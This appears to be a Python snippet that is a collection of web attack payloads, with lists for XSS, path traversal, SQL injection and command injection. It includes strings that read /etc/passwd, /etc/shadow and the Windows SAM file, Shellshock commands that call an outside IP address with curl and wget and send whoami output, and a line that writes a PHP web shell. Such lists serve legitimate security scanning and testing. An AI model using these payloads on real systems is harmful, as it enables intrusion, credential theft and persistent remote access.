
# Add XSS and Path Traversal payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>"
]

path_traversal_payloads = [
    "../etc/passwd",
    "../../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/../../../../../../../../etc/passwd"
]

sql_injection_payloads = [
    "'OR1'=1'@gmail.com",
    # "admin@example.com' --",
    # "admin@example.com' OR '1'='1' --",
    "' OR '1'='1",
    "' UNION SELECT NULL, username, password FROM users --",
    "admin' --",
    "' AND 1=0 UNION SELECT NULL, username, password FROM users --",
    '" OR 1=1 --',
    "' AND 1=IF(1=1, SLEEP(5), 0) --",
    "admin' --",
    "' OR 1=1#",
    "' OR 1=convert(int,(USER))--",  # Error-based SQL Injection
    "' UNION SELECT ALL 1,2,3,4--",  # Union-based SQL Injection
    "' IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--",  # Blind SQL Injection
    "' IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--",  # Blind SQL Injection (extract character)
    "';DECLARE @host varchar(800); SELECT @host = name + '-' + ... exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');--",  # Out-of-Band SQL Injection
    "' HAVING 1=1--",  # Integer-based SQL Injection
    "' UNION SELECT 1,2,database(),4,5/*",  # Union-based SQL Injection (MySQL)
]


command_injection_payloads = [
    "; ls",
    "; whoami",
    "; uname -a",
    "| id",
    "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
    "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->",
    "<!--#exec cmd=\"/usr/bin/id;\"-->",
    "/index.html|id|",
    ";id;",
    ";netstat -a;",
    ";system('cat /etc/passwd')",
    "|id",
    "|/usr/bin/id|",
    "||/usr/bin/id|",
    "\\n/bin/ls -al\\n",
    "\\n/usr/bin/id;",
    "\\nid|",
    "a;id",
    "a|id",
    ";system('id')",
    ";system('/usr/bin/id')",
    "%0Acat /etc/passwd",
    "%0Aid",
    "& ping -i 30 127.0.0.1 &",
    "& ping -n 30 127.0.0.1 &",
    "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=`whoami`\"",
    "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17\"",
    "cat /etc/hosts",
    "system('cat /etc/passwd');",
    "<?php system(\"cat /etc/passwd\");?>",
    "dir",
    "; dir",
    "| dir C:\\",
    "&& dir C:\\",
    "netstat",
    "net view",
    "type C:\\Windows\\repair\\SAM",
    "`ping 127.0.0.1`",
    "system('whoami');",
    "echo '<?php system(\"dir $_GET[\"cmd\"]\"); ?>' > cmd.php"
]
